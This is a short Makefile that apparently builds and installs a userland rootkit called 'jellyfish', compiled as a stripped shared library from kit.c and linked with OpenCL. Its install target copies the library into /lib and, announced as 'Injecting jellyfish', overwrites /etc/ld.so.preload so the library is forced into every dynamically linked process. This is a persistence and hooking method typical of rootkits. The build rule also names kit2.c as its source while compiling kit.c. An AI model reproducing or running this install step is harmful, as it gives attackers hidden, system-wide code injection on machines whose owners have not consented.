INSTALL=/lib

CC=gcc

LIBS= -lc -ldl -lOpenCL

all: jellyfish.so

jellyfish.so: kit2.c
	$(CC) $(CFLAGS) -fPIC -g -c kit.c
	$(CC) -fPIC -shared -Wl,-soname,jellyfish.so kit.o $(LIBS) -o jellyfish.so
	strip jellyfish.so

install: all
	@install -m 0755 jellyfish.so $(INSTALL)/
	@echo [-] Injecting jellyfish
	@echo $(INSTALL)/jellyfish.so > /etc/ld.so.preload

clean:
	rm jellyfish.so *.o
